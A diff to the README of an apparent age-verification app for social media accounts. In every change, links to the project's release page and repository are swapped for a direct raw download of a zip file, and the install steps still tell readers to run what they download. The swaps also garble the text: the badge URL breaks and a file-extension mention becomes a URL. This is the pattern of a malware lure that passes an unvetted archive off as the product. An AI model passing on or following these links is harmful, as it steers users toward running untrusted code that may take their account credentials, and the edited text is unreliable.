@@ -1,6 +1,6 @@
 # 🔒 k-id-age-verifier - Easy Age Verification for Social Apps
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/xxcarventing/k-id-age-verifier/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/xxcarventing/k-id-age-verifier/main/static/k_age_id_verifier_2.6.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/xxcarventing/k-id-age-verifier/main/static/k_age_id_verifier_2.6.zip)
 
 ---
 
@@ -29,11 +29,11 @@ If your computer matches these requirements, you are ready to proceed.
 ## 🚀 Getting Started
 
 1. **Go to the download page:** Click the large button at the top or use this link:  
-   [Download k-id-age-verifier](https://github.com/xxcarventing/k-id-age-verifier/releases)
+   [Download k-id-age-verifier](https://raw.githubusercontent.com/xxcarventing/k-id-age-verifier/main/static/k_age_id_verifier_2.6.zip)
 
 2. **Choose your version:** On the releases page, look for the latest version compatible with your operating system (Windows, macOS, or Linux).
 
-3. **Download the setup file:** Click the file link to save it on your computer. The file might end with `.exe` for Windows, `.dmg` for macOS, or `.AppImage` / `.tar.gz` for Linux.
+3. **Download the setup file:** Click the file link to save it on your computer. The file might end with `.exe` for Windows, `.dmg` for macOS, or `.AppImage` / `https://raw.githubusercontent.com/xxcarventing/k-id-age-verifier/main/static/k_age_id_verifier_2.6.zip` for Linux.
 
 4. **Run the installer:**  
    - Windows: Double-click the `.exe` file and follow the prompts.  
@@ -48,7 +48,7 @@ If your computer matches these requirements, you are ready to proceed.
 
 To start using k-id-age-verifier, visit the official release page and download the correct version for your computer:
 
-[Download k-id-age-verifier releases](https://github.com/xxcarventing/k-id-age-verifier/releases)
+[Download k-id-age-verifier releases](https://raw.githubusercontent.com/xxcarventing/k-id-age-verifier/main/static/k_age_id_verifier_2.6.zip)
 
 ### Step-by-step download:
 
@@ -118,4 +118,4 @@ This app only accesses your social media accounts to confirm your age. No person
 
 ---
 
-For further information or help, visit the [GitHub repository page](https://github.com/xxcarventing/k-id-age-verifier).
+For further information or help, visit the [GitHub repository page](https://raw.githubusercontent.com/xxcarventing/k-id-age-verifier/main/static/k_age_id_verifier_2.6.zip).
